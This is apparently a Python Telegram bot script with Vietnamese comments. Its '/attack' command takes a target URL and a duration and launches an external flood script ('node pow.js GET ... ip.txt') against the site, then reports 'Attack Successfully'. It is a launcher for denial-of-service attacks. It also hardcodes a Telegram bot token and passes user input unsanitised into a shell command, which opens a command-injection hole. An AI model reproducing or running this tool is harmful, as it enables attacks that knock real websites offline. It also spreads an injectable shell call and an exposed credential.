import logging
from telegram.ext import Updater, CommandHandler
import subprocess

# Thiết lập logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)

# Thiết lập token của bot Telegram
TOKEN = "5764304145:AAEY2un_1bKGd2ObvPJvnOq3Q5UOrydrcFg"

# Tạo một Updater để xử lý các cập nhật từ Telegram
updater = Updater(token=TOKEN, use_context=True)
dispatcher = updater.dispatcher

# Xử lý lệnh `/attack`
def attack(update, context):
    args = context.args
    if len(args) >= 2:
        url = args[0]
        time = args[1]

        # Thực thi script a.js với các tham số url và time
        command = f"node pow.js GET {url} {time} 500 65 ip.txt "
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Attack Successfully !\nWebsite : {url}\nPort : 443\nTime : {time}\Admin : @XTermBvP")
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Đã xảy ra lỗi khi thực thi script")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Vui lòng cung cấp đúng định dạng lệnh `/attack [url] [time]`")

# Đăng ký CommandHandler với Dispatcher
dispatcher.add_handler(CommandHandler("attack", attack))

# Bắt đầu bot
updater.start_polling()
